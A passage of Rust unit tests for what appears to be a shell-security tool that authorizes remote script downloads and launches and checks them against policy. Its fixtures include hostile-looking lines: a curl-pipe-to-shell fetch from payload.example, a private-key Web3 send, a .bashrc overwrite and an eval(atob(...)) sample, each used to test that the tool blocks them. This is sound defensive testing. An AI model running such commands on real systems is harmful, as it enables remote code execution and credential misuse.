        for (pin, purpose, pipe) in [
            (
                Some(pin_b.as_str()),
                DownloadPurpose::Execute,
                Some(&requested),
            ),
            (
                Some(pin_a.as_str()),
                DownloadPurpose::SaveOnly,
                Some(&requested),
            ),
            (Some(pin_a.as_str()), DownloadPurpose::Execute, None),
        ] {
            let pending = pending_remote_script_authorization(&operation);
            let consumed = std::cell::Cell::new(false);
            let result = validate_and_authorize_remote_download(
                "https://1.1.1.1/script",
                pin,
                purpose,
                pipe,
                pending,
                &operation,
                |_| {
                    consumed.set(true);
                    panic!("an operation swap reached replay consumption")
                },
            );
            let error = match result {
                Ok(_) => panic!("the exact remote request projection was mutable"),
                Err(error) => error,
            };
            assert!(
                error.contains("does not bind the exact validated download operation"),
                "{error}"
            );
            assert!(!consumed.get());
        }
    }

    #[test]
    fn fetch_save_authorization_binds_destination_and_all_durable_effects() {
        let root = tempfile::tempdir().unwrap();
        let approved = root.path().join("approved.sh");
        let substituted = root.path().join("substituted.sh");
        let binding =
            remote_fetch_save_boundary_binding("https://1.1.1.1/script", &approved, None).unwrap();
        let operation = binding.operation();
        assert_eq!(
            operation.boundary_effects,
            [
                crate::effects::CommandEffectKind::NetworkEgress,
                crate::effects::CommandEffectKind::FilesystemWrite,
                crate::effects::CommandEffectKind::PersistenceChange,
            ]
            .into_iter()
            .collect()
        );
        let pending = pending_remote_script_authorization(&operation);
        let error = match download_to_path_and_mark_tainted_authorized(
            "https://1.1.1.1/script",
            &substituted,
            None,
            pending,
            &operation,
        ) {
            Ok(_) => panic!("a fetch permit authorized another destination"),
            Err(error) => error,
        };
        assert!(error.contains("does not bind the exact URL, pin, and destination"));
        assert!(!approved.exists());
        assert!(!substituted.exists());
    }

    #[test]
    fn command_card_fetch_authorization_binds_cache_root_before_network() {
        let root = tempfile::tempdir().unwrap();
        let approved = root.path().join("approved-cards");
        let substituted = root.path().join("substituted-cards");
        let binding = remote_command_card_cache_boundary_binding(
            "https://1.1.1.1/card.json",
            &approved,
            64 * 1024,
        )
        .unwrap();
        let operation = binding.operation();
        let pending = pending_remote_script_authorization(&operation);
        let error = match download_and_cache_command_card_authorized(
            "https://1.1.1.1/card.json",
            &substituted,
            64 * 1024,
            pending,
            &operation,
        ) {
            Ok(_) => panic!("a command-card permit authorized another cache root"),
            Err(error) => error,
        };
        assert!(error.contains("does not bind the exact URL and cache destination"));
        assert!(!approved.exists());
        assert!(!substituted.exists());
    }

    fn test_script_invocation(interpreter: &str) -> ScriptInvocation {
        ScriptInvocation {
            interpreter: interpreter.to_string(),
            resolved_executable: None,
            args: Vec::new(),
            input_mode: ScriptInputMode::File,
        }
    }

    #[test]
    fn remote_launch_authorization_binds_immutable_bytes_and_final_invocation() {
        let policy = crate::policy::Policy::default();
        let first_bytes = b"#!/bin/sh\nprintf first\n";
        let first_invocation = test_script_invocation("sh");
        let first = prepare_remote_launch_authorization(
            first_bytes,
            &sha256_hex(first_bytes),
            &first_invocation,
            Some(Path::new("/tmp")),
            &policy,
        )
        .expect("first launch authorization");
        let mut changed_invocation = test_script_invocation("sh");
        changed_invocation.args.push("-e".to_string());
        let changed_bytes = b"#!/bin/sh\nprintf changed\n";
        let content_changed = prepare_remote_launch_authorization(
            changed_bytes,
            &sha256_hex(changed_bytes),
            &first_invocation,
            Some(Path::new("/tmp")),
            &policy,
        )
        .expect("content-changed launch authorization");
        let invocation_changed = prepare_remote_launch_authorization(
            first_bytes,
            &sha256_hex(first_bytes),
            &changed_invocation,
            Some(Path::new("/tmp")),
            &policy,
        )
        .expect("invocation-changed launch authorization");
        let mut mode_changed = first_invocation.clone();
        mode_changed.input_mode = ScriptInputMode::Stdin;
        let mode_changed = prepare_remote_launch_authorization(
            first_bytes,
            &sha256_hex(first_bytes),
            &mode_changed,
            Some(Path::new("/tmp")),
            &policy,
        )
        .expect("mode-changed launch authorization");
        let mut policy_changed = policy.clone();
        policy_changed.task_gate.mode = crate::web3_policy::TaskGateMode::Observe;
        let policy_changed = prepare_remote_launch_authorization(
            first_bytes,
            &sha256_hex(first_bytes),
            &first_invocation,
            Some(Path::new("/tmp")),
            &policy_changed,
        )
        .expect("policy-changed launch authorization");

        assert!(first
            .authorization
            .binds_operation(&first.binding.operation()));
        for changed in [
            &content_changed,
            &invocation_changed,
            &mode_changed,
            &policy_changed,
        ] {
            assert!(!first
                .authorization
                .binds_operation(&changed.binding.operation()));
        }
    }

    #[test]
    fn remote_launch_refuses_a_denied_inferred_script_effect() {
        let mut policy = crate::policy::Policy::default();
        policy.task_gate.mode = crate::web3_policy::TaskGateMode::Enforce;
        policy
            .task_gate
            .effects_denied_for_untrusted_sources
            .insert(crate::effects::CommandEffectKind::Web3Write);
        let content = b"cast send 0xabc --private-key 0xdead\n";

        let result = prepare_remote_launch_authorization(
            content,
            &sha256_hex(content),
            &test_script_invocation("sh"),
            Some(Path::new("/tmp")),
            &policy,
        );
        let error = match result {
            Ok(_) => panic!("a denied Web3 write effect was authorized"),
            Err(error) => error,
        };

        assert!(error.contains("remote-script launch authorization refused"));
    }

    #[cfg(target_os = "linux")]
    fn target_test_channel(
        spec: &mut crate::capsule::CapsuleSpec,
    ) -> (TargetLaunchStatusPipe, std::fs::File, std::fs::File) {
        let (channel, arm) =
            TargetLaunchStatusPipe::create(spec, "test-kernel-controller".to_string())
                .expect("target launch test channel");
        let status_writer = arm
            .status_writer
            .try_clone()
            .expect("clone guard status endpoint");
        let ack_guard = arm
            .ack_guard
            .try_clone()
            .expect("clone guard authorization endpoint");
        drop(arm);
        (channel, status_writer, ack_guard)
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_handshake_accepts_only_observed_ack_resumed_eof() {
        use std::io::{Read as _, Write as _};

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        let guard = std::thread::spawn(move || {
            status_writer
                .write_all(&[TARGET_EXEC_OBSERVED])
                .expect("report stopped exec");
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack).expect("read one-shot ACK");
            assert_eq!(ack, [TARGET_ACK_RESUME]);
            status_writer
                .write_all(&[TARGET_LAUNCH_RESUMED])
                .expect("report resumed target");
        });
        let authorized = std::sync::atomic::AtomicBool::new(false);
        confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| {
                authorized.store(true, std::sync::atomic::Ordering::SeqCst);
                Ok(())
            },
            |_| Ok(()),
            || Ok(()),
        )
        .expect("ordered terminal handshake");
        guard.join().expect("guard protocol thread");
        assert!(authorized.load(std::sync::atomic::Ordering::SeqCst));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_handshake_rejects_invalid_duplicate_and_out_of_order_status() {
        use std::io::{Read as _, Write as _};

        for sequence in [vec![b'X'], vec![TARGET_LAUNCH_RESUMED]] {
            let mut spec = crate::capsule::CapsuleSpec::locked_down();
            let (channel, mut writer, ack_guard) = target_test_channel(&mut spec);
            drop(ack_guard);
            let guard = std::thread::spawn(move || writer.write_all(&sequence));
            let refusal = confirm_linux_kernel_exec_until(
                channel,
                std::time::Instant::now() + std::time::Duration::from_secs(1),
                (),
                |_| Ok(()),
                |_| Ok(()),
                || Ok(()),
            )
            .expect_err("invalid status sequence must fail closed");
            assert!(
                refusal.contains("invalid")
                    || refusal.contains("out-of-order")
                    || refusal.contains("duplicate"),
                "{refusal}"
            );
            guard
                .join()
                .expect("status writer thread")
                .expect("write invalid status fixture");
        }

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut writer, mut ack_guard) = target_test_channel(&mut spec);
        let guard = std::thread::spawn(move || {
            writer.write_all(&[TARGET_EXEC_OBSERVED])?;
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            assert_eq!(ack, [TARGET_ACK_RESUME]);
            writer.write_all(&[TARGET_EXEC_OBSERVED])
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Ok(()),
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("duplicate OBSERVED after an ACK must fail closed");
        assert!(refusal.contains("duplicate"), "{refusal}");
        guard
            .join()
            .expect("duplicate-observation thread")
            .expect("write duplicate observation");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_handshake_never_acks_after_authorizer_deadline() {
        use std::io::{Read as _, Write as _};

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        status_writer
            .write_all(&[TARGET_EXEC_OBSERVED])
            .expect("queue OBSERVED before deadline starts");
        let guard = std::thread::spawn(move || {
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            drop(status_writer);
            Ok::<Vec<u8>, std::io::Error>(ack)
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_millis(50),
            (),
            |_| {
                std::thread::sleep(std::time::Duration::from_millis(100));
                Ok(())
            },
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("expired authorization must not resume the target");
        assert!(refusal.contains("exceeded"), "{refusal}");
        assert!(
            guard
                .join()
                .expect("guard deadline thread")
                .expect("read closed ACK")
                .is_empty(),
            "an ACK was sent after the monotonic deadline"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_authorizer_failure_sends_no_ack() {
        use std::io::{Read as _, Write as _};

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        status_writer
            .write_all(&[TARGET_EXEC_OBSERVED])
            .expect("queue stopped exec observation");
        let guard = std::thread::spawn(move || {
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            drop(status_writer);
            Ok::<Vec<u8>, std::io::Error>(ack)
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Err::<(), _>("injected durable commit failure".to_string()),
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("failed parent authorization must keep the target stopped");
        assert!(refusal.contains("durable commit failure"), "{refusal}");
        assert!(
            guard
                .join()
                .expect("authorizer failure guard thread")
                .expect("read ACK EOF")
                .is_empty(),
            "parent sent ACK after authorization failure"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_abort_precedes_drop_of_gate_retained_by_failed_authorizer() {
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        struct AuthorizationStateDrop(Arc<AtomicBool>);
        impl Drop for AuthorizationStateDrop {
            fn drop(&mut self) {
                self.0.store(true, Ordering::SeqCst);
            }
        }

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        status_writer
            .write_all(&[TARGET_EXEC_OBSERVED])
            .expect("queue stopped exec observation");
        let guard = std::thread::spawn(move || {
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            drop(status_writer);
            Ok::<Vec<u8>, std::io::Error>(ack)
        });
        let dropped = Arc::new(AtomicBool::new(false));
        let abort_dropped = Arc::clone(&dropped);
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            AuthorizationStateDrop(Arc::clone(&dropped)),
            |_| Err::<(), _>("injected durable commit failure".to_string()),
            |_| Ok(()),
            || {
                assert!(
                    !abort_dropped.load(Ordering::SeqCst),
                    "stable-lock gate dropped before target cleanup"
                );
                Ok(())
            },
        )
        .expect_err("failed authorization must abort while retaining the gate");
        assert!(refusal.contains("durable commit failure"), "{refusal}");
        assert!(dropped.load(Ordering::SeqCst));
        assert!(
            guard
                .join()
                .expect("authorizer failure guard thread")
                .expect("read ACK EOF")
                .is_empty(),
            "parent sent ACK after authorization failure"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_abort_runs_before_the_stable_lock_permit_is_dropped() {
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        struct PermitDrop(Arc<AtomicBool>);
        impl Drop for PermitDrop {
            fn drop(&mut self) {
                self.0.store(true, Ordering::SeqCst);
            }
        }

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        let guard = std::thread::spawn(move || {
            status_writer.write_all(&[TARGET_EXEC_OBSERVED])?;
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            assert_eq!(ack, [TARGET_ACK_RESUME]);
            status_writer.write_all(b"X")
        });
        let dropped = Arc::new(AtomicBool::new(false));
        let aborted = Arc::new(AtomicBool::new(false));
        let abort_dropped = Arc::clone(&dropped);
        let abort_called = Arc::clone(&aborted);
        let permit_dropped = Arc::clone(&dropped);
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Ok(PermitDrop(permit_dropped)),
            |_| Ok(()),
            || {
                assert!(
                    !abort_dropped.load(Ordering::SeqCst),
                    "stable-lock permit dropped before target cleanup"
                );
                abort_called.store(true, Ordering::SeqCst);
                Ok(())
            },
        )
        .expect_err("invalid post-ACK status must abort the target");
        assert!(matches!(&refusal, KernelExecConfirmationError::AfterAck(_)));
        assert!(refusal.contains("invalid"), "{refusal}");
        assert!(aborted.load(Ordering::SeqCst));
        assert!(dropped.load(Ordering::SeqCst));
        guard
            .join()
            .expect("abort-order guard thread")
            .expect("write invalid post-ACK status");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_handshake_types_post_ack_eof_as_executed() {
        use std::io::{Read as _, Write as _};

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        let guard = std::thread::spawn(move || {
            status_writer.write_all(&[TARGET_EXEC_OBSERVED])?;
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            assert_eq!(ack, [TARGET_ACK_RESUME]);
            // Drop without RESUMED: the authorized target may already have run.
            Ok::<(), std::io::Error>(())
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Ok(()),
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("post-ACK EOF must remain phase typed");
        assert!(matches!(&refusal, KernelExecConfirmationError::AfterAck(_)));
        assert!(refusal.contains("exited before completing"), "{refusal}");
        guard
            .join()
            .expect("post-ACK EOF guard thread")
            .expect("write observation and read ACK");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_handshake_rejects_resume_prequeued_before_ack() {
        use std::io::{Read as _, Write as _};

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, mut ack_guard) = target_test_channel(&mut spec);
        status_writer
            .write_all(&[TARGET_EXEC_OBSERVED, TARGET_LAUNCH_RESUMED])
            .expect("prequeue causally invalid status");
        let guard = std::thread::spawn(move || {
            let mut ack = Vec::new();
            ack_guard.read_to_end(&mut ack)?;
            drop(status_writer);
            Ok::<Vec<u8>, std::io::Error>(ack)
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Ok(()),
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("RESUMED queued before ACK must fail closed");
        assert!(refusal.contains("before parent authorization"), "{refusal}");
        assert!(
            guard
                .join()
                .expect("causal-order guard thread")
                .expect("read ACK EOF")
                .is_empty(),
            "causally invalid guard received ACK"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_closed_ack_reader_returns_error_without_sigpipe() {
        use std::io::Write as _;

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        let (channel, mut status_writer, ack_guard) = target_test_channel(&mut spec);
        let guard = std::thread::spawn(move || {
            drop(ack_guard);
            status_writer.write_all(&[TARGET_EXEC_OBSERVED])
        });
        let refusal = confirm_linux_kernel_exec_until(
            channel,
            std::time::Instant::now() + std::time::Duration::from_secs(1),
            (),
            |_| Ok(()),
            |_| Ok(()),
            || Ok(()),
        )
        .expect_err("closed ACK peer must fail closed");
        assert!(refusal.contains("without SIGPIPE"), "{refusal}");
        guard
            .join()
            .expect("closed-ACK thread")
            .expect("write OBSERVED");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_channels_reject_an_insufficient_fd_budget() {
        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        spec.resources.max_open_files = Some(3);
        let refusal =
            TargetLaunchStatusPipe::create(&mut spec, "test-insufficient-fd-budget".to_string())
                .expect_err("protocol channels must fit below the capsule fd limit");
        assert!(refusal.contains("fd limit"), "{refusal}");
        assert!(spec.handles.extra_unix_fds.is_empty());
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn target_exec_parent_endpoints_do_not_consume_the_dense_child_fd_budget() {
        use std::io::Write as _;
        use std::os::fd::{AsRawFd as _, FromRawFd as _};

        let mut source = tempfile::tempfile().expect("dense-fd source");
        source
            .write_all(b"fd-shape")
            .expect("write dense-fd source");
        let mut dense = Vec::new();
        loop {
            let descriptor = unsafe { libc::fcntl(source.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 3) };
            assert!(descriptor >= 0, "fill dense child descriptor range");
            // SAFETY: F_DUPFD_CLOEXEC returned a new owned descriptor.
            dense.push(unsafe { std::os::fd::OwnedFd::from_raw_fd(descriptor) });
            if descriptor >= 91 {
                break;
            }
        }

        let mut spec = crate::capsule::CapsuleSpec::locked_down();
        spec.resources.max_open_files = Some(96);
        let (channel, arm) =
            TargetLaunchStatusPipe::create(&mut spec, "test-dense-fd-controller".to_string())
                .expect("protocol uses exactly two low child descriptors");
        let status_fd = arm.status_writer.as_raw_fd();
        let ack_fd = arm.ack_guard.as_raw_fd();
        assert!((3..96).contains(&status_fd));
        assert!((3..96).contains(&ack_fd));
        assert_ne!(status_fd, ack_fd);
        assert!(channel.status_reader.as_raw_fd() >= 96);
        assert!(
            channel
                .ack_parent
                .as_ref()
                .expect("parent ACK endpoint")
                .as_raw_fd()
                >= 96
        );

        let first = unsafe { libc::fcntl(source.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 3) };
        assert!((3..96).contains(&first));
        // SAFETY: F_DUPFD_CLOEXEC returned a new owned descriptor.
        let first = unsafe { std::os::fd::OwnedFd::from_raw_fd(first) };
        let second = unsafe { libc::fcntl(source.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 3) };
        assert!((3..96).contains(&second));
        // SAFETY: F_DUPFD_CLOEXEC returned a new owned descriptor.
        let second = unsafe { std::os::fd::OwnedFd::from_raw_fd(second) };
        let full_shape = [status_fd, ack_fd, first.as_raw_fd(), second.as_raw_fd()];
        for (index, descriptor) in full_shape.iter().enumerate() {
            assert!(
                !full_shape[index + 1..].contains(descriptor),
                "full child FD shape collided: {full_shape:?}"
            );
        }
    }

    #[test]
    fn execution_transport_rejects_http_without_pin() {
        let err = validate_download_request(
            "http://downloads.example/install.sh",
            None,
            DownloadPurpose::Execute,
        )
        .expect_err("unpinned HTTP executable download must fail");
        assert!(err.contains("HTTPS"));
    }

    #[test]
    fn execution_transport_allows_direct_http_with_valid_compatibility_pin() {
        let parsed = url::Url::parse("http://downloads.example/install.sh").unwrap();
        validate_initial_transport(&parsed, true, DownloadPurpose::Execute)
            .expect("a valid digest pin authenticates a direct HTTP compatibility download");
    }

    #[test]
    fn execution_transport_rejects_https_downgrade_even_with_pin() {
        let previous = url::Url::parse("https://downloads.example/install.sh").unwrap();
        let target = url::Url::parse("http://cdn.example/install.sh").unwrap();
        let err = validate_redirect_target(&previous, &target, DownloadPurpose::Execute)
            .expect_err("execution redirects must never downgrade HTTPS");
        assert!(err.contains("redirect") && err.contains("HTTPS"));
    }

    #[test]
    fn non_executing_download_keeps_http_compatibility() {
        let parsed = url::Url::parse("http://downloads.example/archive.txt").unwrap();
        validate_initial_transport(&parsed, false, DownloadPurpose::SaveOnly)
            .expect("save-only downloads retain the existing HTTP contract");
    }

    #[test]
    fn unsuccessful_status_is_rejected_before_body_handling() {
        let err = require_success_status(reqwest::StatusCode::NOT_FOUND)
            .expect_err("an HTTP error body must not become script content");
        assert!(err.contains("404"));
    }

    #[test]
    fn malformed_pin_wins_before_url_or_network_validation() {
        let err =
            validate_download_request("not a URL", Some("not-a-sha256"), DownloadPurpose::Execute)
                .expect_err("malformed digest must be rejected first");
        assert!(err.starts_with("invalid SHA-256 pin:"), "{err}");
    }

    #[test]
    fn blocking_shell_content_produces_a_blocking_review() {
        let dir = tempfile::tempdir().unwrap();
        let review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .expect("supported UTF-8 shell content must be analyzed");
        assert!(review.analysis_complete);
        assert_eq!(
            review.raw_verdict.unwrap().action,
            crate::verdict::Action::Block
        );
    }

    #[cfg(unix)]
    #[test]
    fn confirmed_review_reloads_policy_and_makes_the_fresh_prepared_verdict_authoritative() {
        let mut global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global runner state");
        let isolated = tempfile::tempdir().expect("isolated fresh runner decision");
        let policy_dir = isolated.path().join(".tirith");
        std::fs::create_dir_all(&policy_dir).expect("create policy directory");
        let config_home = isolated.path().join("config");
        let cache_home = isolated.path().join("cache");
        let data_home = isolated.path().join("data");
        let state_home = isolated.path().join("state");
        global.set_env("HOME", isolated.path());
        global.set_env("XDG_CONFIG_HOME", &config_home);
        global.set_env("XDG_CACHE_HOME", &cache_home);
        global.set_env("XDG_DATA_HOME", &data_home);
        global.set_env("XDG_STATE_HOME", &state_home);
        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
        global.remove_env("TIRITH_SERVER_URL");
        global.remove_env("TIRITH_API_KEY");
        global.remove_env("TIRITH");
        global.set_env("TIRITH_LOG", "0");

        let policy_path = policy_dir.join("policy.yaml");
        std::fs::write(
            &policy_path,
            "severity_overrides:\n  dotfile_overwrite: MEDIUM\nstrict_warn: false\n",
        )
        .expect("write preview policy");
        let content = b"#!/bin/bash\necho reviewed > ~/.bashrc\n";
        let session_id = "runner_fresh_policy";
        let preview = review_script_bytes_for_session(
            content,
            true,
            true,
            Some(isolated.path()),
            Some("bash"),
            session_id,
        )
        .expect("preview analysis");
        assert_eq!(
            preview
                .effective_verdict
                .as_ref()
                .expect("preview verdict")
                .action,
            Action::Warn
        );
        let preview_policy_hash = preview
            .policy
            .as_ref()
            .expect("preview policy")
            .execution_identity_hash()
            .expect("preview policy identity");
        assert!(
            !crate::session_warnings::session_state_path(session_id)
                .expect("preview session path")
                .exists(),
            "read-only preview must not materialize warning history"
        );

        std::fs::write(
            &policy_path,
            "severity_overrides:\n  dotfile_overwrite: MEDIUM\naction_overrides:\n  dotfile_overwrite: block\nstrict_warn: false\n",
        )
        .expect("replace policy while confirmation is pending");
        let confirmed = prepare_confirmed_script_review(
            content,
            true,
            Some(isolated.path()),
            "bash",
            false,
            true,
            session_id,
        )
        .expect("fresh post-confirmation decision");
        assert_eq!(confirmed.review.interpreter, "bash");
        assert_eq!(confirmed.prepared.verdict().action, Action::Block);
        let final_policy_hash = confirmed
            .review
            .policy
            .as_ref()
            .expect("fresh policy")
            .execution_identity_hash()
            .expect("fresh policy identity");
        assert_ne!(preview_policy_hash, final_policy_hash);
        assert!(
            confirmed.prepared.into_authorizable_draft().is_err(),
            "the fresh blocking decision, not the preview, controls authorization"
        );
    }

    #[test]
    fn appended_codefile_finding_uses_frozen_policy_severity_override() {
        let mut verdict = Verdict::allow_fast(1, crate::verdict::Timings::default());
        let mut policy = crate::policy::Policy::default();
        policy.severity_overrides.insert(
            "dynamic_code_execution".to_string(),
            crate::verdict::Severity::High,
        );
        append_policy_aware_codefile_findings(
            &mut verdict,
            &policy,
            r#"eval(atob("SGVsbG8gV29ybGQ="))"#,
            Some("downloaded-script.sh"),
        );
        let finding = verdict
            .findings
            .iter()
            .find(|finding| finding.rule_id == crate::verdict::RuleId::DynamicCodeExecution)
            .expect("code-file-only finding");
        assert_eq!(finding.severity, crate::verdict::Severity::High);
        assert_eq!(verdict.action, Action::Block);
    }

    #[test]
    fn verdict_presentation_and_required_bypass_audit_fail_closed() {
        struct FailingWriter;
        impl std::io::Write for FailingWriter {
            fn write(&mut self, _bytes: &[u8]) -> std::io::Result<usize> {
                Err(std::io::Error::new(
                    std::io::ErrorKind::BrokenPipe,
                    "injected renderer failure",
                ))
            }

            fn flush(&mut self) -> std::io::Result<()> {
                Ok(())
            }
        }

        let verdict = Verdict::from_findings(
            vec![crate::verdict::Finding {
                rule_id: crate::verdict::RuleId::CurlPipeShell,
                severity: crate::verdict::Severity::High,
                title: "fixture".to_string(),
                description: "fixture".to_string(),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            1,
            crate::verdict::Timings::default(),
        );
        let render_error = present_complete_verdict(&verdict, &[], FailingWriter)
            .expect_err("a verdict that was not presented cannot reach confirmation");
        assert!(
            render_error.contains("could not be presented"),
            "{render_error}"
        );

        let audit_error =
            enforce_required_bypass_audit(true, Err("injected durable audit failure".to_string()))
                .expect_err("a live bypass without durable audit cannot reach confirmation");
        assert!(
            audit_error.contains("required audit record"),
            "{audit_error}"
        );
        assert!(enforce_required_bypass_audit(false, Err("best effort".to_string())).is_ok());
    }

    #[test]
    fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
        let dir = tempfile::tempdir().unwrap();
        let invalid = b"#!/bin/sh\n\xff\n";
        assert!(review_script_bytes(invalid, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(invalid, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain incomplete inspection");
        assert!(!inspect.analysis_complete);
        assert_eq!(inspect.incomplete_reason, Some("invalid-utf8"));
        assert!(inspect.effective_verdict.is_none());

        let unsupported = b"#!/usr/bin/awk -f\nBEGIN { print \"ok\" }\n";
        assert!(review_script_bytes(unsupported, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(unsupported, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain unsupported-interpreter inspection");
        assert!(!inspect.analysis_complete);
        assert_eq!(inspect.incomplete_reason, Some("unsupported-interpreter"));
        assert!(inspect.effective_verdict.is_none());
    }

    #[test]
    fn forced_shell_review_ignores_remote_python_and_node_shebangs() {
        let dir = tempfile::tempdir().unwrap();
        for content in [
            b"#!/usr/bin/env python3\nprint('remote python')\n".as_slice(),
            b"#!/usr/bin/env node\nconsole.log('remote node')\n".as_slice(),
        ] {
            let review = review_script_bytes(content, true, false, Some(dir.path()), Some("bash"))
                .expect("forced bash has a complete shell analyzer");
            assert_eq!(review.interpreter, "bash");
            assert!(review.analysis_complete);
        }
    }

    #[test]
    fn pipe_interpreter_argv_contract_is_narrow() {
        assert!(pipe_interpreter_args_supported(PipeInterpreter::Bash, &[]));
        assert!(pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "feature".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-e".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Fish,
            &["-s".into(), "--".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "bad\rarg".into()]
        ));
    }

    #[test]
    fn legacy_path_executor_shape_is_retained_but_live_execution_fails_before_io() {
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        let called = Arc::new(AtomicBool::new(false));
        let callback_called = Arc::clone(&called);
        let options = RunOptions {
            url: "not-a-url".to_string(),
            no_exec: false,
            interactive: true,
            expected_sha256: None,
            // Keep the original public callback arity and argument types. The
            // value may still be constructed by downstream code, but live use
            // must be rejected before URL parsing, prompting, or invocation.
            exec_fn: Some(Box::new(move |_, _| {
                callback_called.store(true, Ordering::Release);
                Ok(0)
            })),
        };

        let error = match run(options) {
            Ok(_) => panic!("legacy live executor unexpectedly ran"),
            Err(error) => error,
        };
        assert!(
            error.contains("legacy path-based script executors"),
            "{error}"
        );
        assert!(
            !error.contains("invalid URL"),
            "network parsing ran: {error}"
        );
        assert!(!called.load(Ordering::Acquire));
    }

    #[test]
    fn no_exec_full_run_never_invokes_legacy_callback_or_executes_blocked_body() {
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        let mut global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global runner state");
        let isolated = tempfile::tempdir().unwrap();
        global.set_env("HOME", isolated.path());
        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
        global.set_env("XDG_DATA_HOME", isolated.path().join("data"));
        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
        global.set_env("NO_PROXY", "127.0.0.1,localhost");
        global.remove_env("TIRITH_SERVER_URL");
        global.remove_env("TIRITH_API_KEY");
        global.set_env("TIRITH_LOG", "0");

        let body: &'static [u8] =
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let address = listener.local_addr().unwrap();
        let server = std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = [0u8; 2048];
            let _ = stream.read(&mut request);
